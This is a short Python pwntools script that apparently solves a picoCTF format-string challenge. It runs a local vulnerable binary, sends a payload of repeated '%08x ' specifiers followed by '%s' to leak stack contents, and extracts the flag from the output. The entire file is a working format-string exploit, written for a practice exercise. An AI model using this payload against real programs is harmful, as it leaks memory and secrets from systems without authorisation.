from pwn import *


def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process(argv=['/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4/vuln'], stdin=stdin, stdout=stdout)

def _sendlineafter(term, inp):
    print sh.recvuntil(term)
    print inp
    sh.sendline(inp)

payload = '%08x '*(9*4) + '%s'
def test(guess):
    start()
    _sendlineafter(":\n", payload)
    output = sh.recvall()
    output = output.split("picoCTF{")[1]
    output = output.split("}")[0]
    print "picoCTF{" + output + "}"

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
